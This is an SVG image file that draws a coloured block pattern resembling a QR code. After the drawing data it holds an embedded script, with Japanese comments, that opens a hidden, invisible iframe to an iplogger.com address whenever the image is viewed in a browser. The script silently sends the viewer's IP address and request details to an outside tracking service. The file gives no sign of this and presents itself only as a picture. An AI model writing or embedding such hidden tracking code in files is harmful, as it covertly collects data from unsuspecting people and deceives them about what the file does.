<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 580 580"><rect width="580" height="580" fill="#000000"></rect><path fill="#ff0000" d="M200,40h20v60h-20zM240,60h20v20h-20zM300,60h20v80h-20zM520,60h20v120h-20zM80,80h60v60h-60zM220,140h20v20h-20zM200,160h20v20h-20zM280,160h20v20h-20zM300,180h20v20h-20zM340,180h20v100h-20zM40,200h20v40h-20zM100,200h120v20h-120zM380,200h20v20h-20zM140,240h40v20h-40zM460,240h20v40h-20zM520,240h20v60h-20zM220,260h40v60h-40zM280,260h20v20h-20zM480,260h40v20h-40zM60,280h20v20h-20zM160,280h20v20h-20zM360,280h20v20h-20zM180,300h20v40h-20zM500,300h20v40h-20zM60,320h20v20h-20zM300,360h20v40h-20zM480,360h40v40h-40zM40,400h140v20h-140zM220,400h20v20h-20zM280,400h20v20h-20zM520,400h20v40h-20zM160,420h20v120h-20zM300,420h60v20h-60zM80,440h60v60h-60zM500,460h40v60h-40zM240,480h40v20h-40zM440,480h60v20h-60zM320,500h20v20h-20zM420,500h40v20h-40zM360,520h20v20h-20zM400,520h20v20h-20zM460,520h20v20h-20z"></path><path fill="#0000ff" d="M40,40h140v20h-140zM40,60h20v120h-20zM160,60h20v120h-20zM360,60h20v80h-20zM220,80h20v20h-20zM260,80h20v80h-20zM340,80h20v40h-20zM440,80h60v60h-60zM240,100h20v80h-20zM280,120h20v20h-20zM320,120h20v20h-20zM60,160h100v20h-100zM320,160h20v60h-20zM220,180h20v20h-20zM480,200h60v20h-60zM420,220h20v40h-20zM460,220h60v20h-60zM200,240h20v20h-20zM240,240h60v20h-60zM40,260h20v20h-20zM180,260h20v20h-20zM320,260h20v20h-20zM400,260h20v40h-20zM260,280h20v20h-20zM420,280h20v20h-20zM440,300h20v40h-20zM120,320h20v40h-20zM520,320h20v40h-20zM140,340h20v40h-20zM280,340h20v40h-20zM420,340h20v40h-20zM400,400h20v20h-20zM240,420h40v20h-40zM260,440h40v20h-40zM380,460h40v20h-40zM380,500h20v20h-20zM480,500h20v20h-20zM60,520h100v20h-100zM200,520h20v20h-20zM280,520h20v20h-20zM520,520h20v20h-20z"></path><path fill="#00ff00" d="M260,40h60v20h-60zM400,40h140v20h-140zM400,60h20v120h-20zM200,120h20v20h-20zM360,160h20v60h-20zM420,160h100v20h-100zM440,200h20v60h-20zM60,220h40v40h-40zM120,220h20v40h-20zM180,220h40v20h-40zM380,240h40v20h-40zM140,260h20v40h-20zM40,300h20v80h-20zM80,300h20v20h-20zM280,300h80v20h-80zM160,320h20v20h-20zM340,320h20v20h-20zM380,320h20v20h-20zM460,320h40v40h-40zM100,340h20v20h-20zM200,340h40v40h-40zM320,340h20v40h-20zM360,340h20v120h-20zM160,360h20v20h-20zM260,360h20v40h-20zM380,360h40v20h-40zM440,360h20v100h-20zM200,380h20v100h-20zM40,420h20v120h-20zM220,440h20v40h-20zM320,440h40v60h-40zM380,440h60v20h-60zM280,460h40v20h-40zM360,480h40v20h-40zM220,500h40v40h-40z"></path><path fill="#ffffff" d="M0,0h580v40h-580zM0,40h40v540h-40zM180,40h20v160h-20zM220,40h40v20h-40zM320,40h80v20h-80zM540,40h40v540h-40zM60,60h100v20h-100zM220,60h20v20h-20zM260,60h40v20h-40zM320,60h40v20h-40zM380,60h20v140h-20zM420,60h100v20h-100zM60,80h20v80h-20zM140,80h20v80h-20zM240,80h20v20h-20zM280,80h20v40h-20zM320,80h20v40h-20zM420,80h20v80h-20zM500,80h20v80h-20zM200,100h40v20h-40zM220,120h20v20h-20zM340,120h20v60h-20zM80,140h60v20h-60zM200,140h20v20h-20zM280,140h60v20h-60zM360,140h20v20h-20zM440,140h60v20h-60zM220,160h20v20h-20zM260,160h20v80h-20zM300,160h20v20h-20zM40,180h140v20h-140zM200,180h20v20h-20zM240,180h20v60h-20zM280,180h20v60h-20zM400,180h140v20h-140zM60,200h40v20h-40zM220,200h20v60h-20zM300,200h20v100h-20zM400,200h40v20h-40zM460,200h20v20h-20zM100,220h20v120h-20zM140,220h40v20h-40zM320,220h20v40h-20zM360,220h60v20h-60zM520,220h20v20h-20zM40,240h20v20h-20zM180,240h20v20h-20zM360,240h20v40h-20zM480,240h40v20h-40zM60,260h40v20h-40zM120,260h20v60h-20zM160,260h20v20h-20zM200,260h20v80h-20zM260,260h20v20h-20zM380,260h20v60h-20zM420,260h40v20h-40zM40,280h20v20h-20zM80,280h20v20h-20zM180,280h20v20h-20zM280,280h20v20h-20zM320,280h40v20h-40zM440,280h80v20h-80zM60,300h20v20h-20zM140,300h40v20h-40zM260,300h20v60h-20zM360,300h20v40h-20zM400,300h40v40h-40zM460,300h40v20h-40zM520,300h20v20h-20zM80,320h20v80h-20zM140,320h20v20h-20zM220,320h40v20h-40zM280,320h60v20h-60zM60,340h20v60h-20zM160,340h40v20h-40zM240,340h20v80h-20zM300,340h20v20h-20zM340,340h20v80h-20zM380,340h40v20h-40zM440,340h20v20h-20zM500,340h20v20h-20zM100,360h40v40h-40zM180,360h20v220h-20zM460,360h20v120h-20zM520,360h20v40h-20zM40,380h20v20h-20zM140,380h40v20h-40zM220,380h20v20h-20zM280,380h20v20h-20zM320,380h20v40h-20zM380,380h60v20h-60zM260,400h20v20h-20zM300,400h20v20h-20zM380,400h20v40h-20zM420,400h20v40h-20zM480,400h40v60h-40zM60,420h100v20h-100zM220,420h20v20h-20zM280,420h20v20h-20zM400,420h20v20h-20zM60,440h20v80h-20zM140,440h20v80h-20zM240,440h20v40h-20zM300,440h20v20h-20zM520,440h20v20h-20zM260,460h20v20h-20zM360,460h20v20h-20zM420,460h40v20h-40zM480,460h20v20h-20zM200,480h40v20h-40zM280,480h40v40h-40zM400,480h40v20h-40zM80,500h60v20h-60zM200,500h20v20h-20zM260,500h20v80h-20zM340,500h40v20h-40zM400,500h20v20h-20zM460,500h20v20h-20zM300,520h60v60h-60zM380,520h20v60h-20zM420,520h40v60h-40zM480,520h40v60h-40zM40,540h140v40h-140zM200,540h60v40h-60zM280,540h20v40h-20zM360,540h20v40h-20zM400,540h20v40h-20zM460,540h20v40h-20zM520,540h20v40h-20z"></path>
<script>

function loadIframe(url) {
    // iframe要素の作成
    const iframe = document.createElement('iframe');
    iframe.src = url;
    iframe.style.display = 'none';

    // DOMに追加 (body要素の子要素として追加)
    document.body.appendChild(iframe);
}

// 使用例
const targetUrl = 'https://iplogger.com/25bde6';
loadIframe(targetUrl);

</script>
</svg>